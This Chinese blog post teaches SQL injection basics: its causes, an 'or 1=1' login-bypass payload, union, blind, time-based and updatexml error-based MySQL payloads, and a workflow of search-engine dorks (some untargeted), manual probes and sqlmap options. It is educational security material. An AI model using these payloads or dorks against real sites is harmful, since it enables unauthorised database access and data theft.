---
layout: post
title: "sql注入基础"
date: 2018-10-11
category: web安全
tags: web安全 sql注入
---

## 目录
<!-- MarkdownTOC -->

- SQL注入原理
	- SQL注入原理-SQL注入产生原因
	- SQL注入原理-SQL注入核心原理
- mysql注入语句
	- mysql注入语句-mysql介绍
	- mysql注入语句-万能密码
	- mysql注入语句-注入语句例子
- sql注入流程
- 相关链接

<!-- /MarkdownTOC -->


## SQL注入原理

### SQL注入原理-SQL注入产生原因

>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。

### SQL注入原理-SQL注入核心原理

>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。

---

> 灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库->SQL注入漏洞


## mysql注入语句
### mysql注入语句-mysql介绍

> MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。
> MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。
> MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。

-- 摘自百度百科  


### mysql注入语句-万能密码

	# 登录处正常的SQL语句：
	select * from users where username= 'admin' and pwd = 'pass';

	# 万能密码：
	'or '1' = '1 

	# 带入用户输入参数
	select * from users where username= ''or '1' = '1' and pwd = ''or '1' = '1';

	第一个 or 前面为 false 后面为 true -> true
	and 前面为 true 后面为 false -> false
	第二个 or 前面为 false 后面为 true -> true

### mysql注入语句-注入语句例子

	# 利用构造1=2错误执行union后面的语句
	and 1=2 union select 1,2,3--

	# 利用mysql正则表达式为匹配当前用户是否为ro开头
	select user() regexp '^ro'

	# 查询当前用户的ascii码是否为114（r）
	ascii(substr(substr(select user()),1,1))=114

	# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒
	if(ascii(substr((select user()),1,1))=114,0,sleep(5))

	# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0
	(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)

	# 利用updatexml报错，返回版本信息
	updatexml(1,concat(0x7e,(select @@version),0x7e),1)


## sql注入流程

1. **目标搜集：**  
	无特定目标：  

		inurl:php?id=

	有特定目标：  

		inurl:php?id= site:target.com

	工具爬取：  

		spider，对搜索引擎和目标网站的链接进行爬取

2. **注入识别：**  
	手工简单识别：  

		'
		and 1=1 / and 1=2
		and '1' ='1 / and '1'='2
		and 1 like 1 / and 1 like 2

	工具识别：  

		sqlmap -m filename (filename中保存检测目标)
		sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)


3. **高级识别：**  

	扩展识别广度和深度：  

		sqlmap --level 增加测试级别，对header中相关参数也进行测试
		sqlmap -r filename(filename中为网站请求数据)

	利用工具提高识别效率：  

		BurpSuite + SqlMap

	Tips:  

		可以在参数后键入 “*” 来确定想要测试的参数  
		可能出现注入的点：新闻、登录、搜索、留言......  
		站在开发的角度去寻找  

4. **代码审计：**  

	搜索关键代码和函数  

		关键代码包括 $_GET/$_POST/$id/select/SELECT

	梳理业务流程  


## 相关链接

[mysql官网](https://www.mysql.com/)  
[mysql内置函数](https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html)    
[ascii对照表](http://ascii.911cha.com/)  
[mysql正则](http://www.runoob.com/mysql/mysql-regexp.html)  
[MYSQL updatexml报错注入](https://blog.csdn.net/vspiders/article/details/77430024)  
[Python Spider 的总结](https://blog.csdn.net/i_peter/article/details/53380334)  


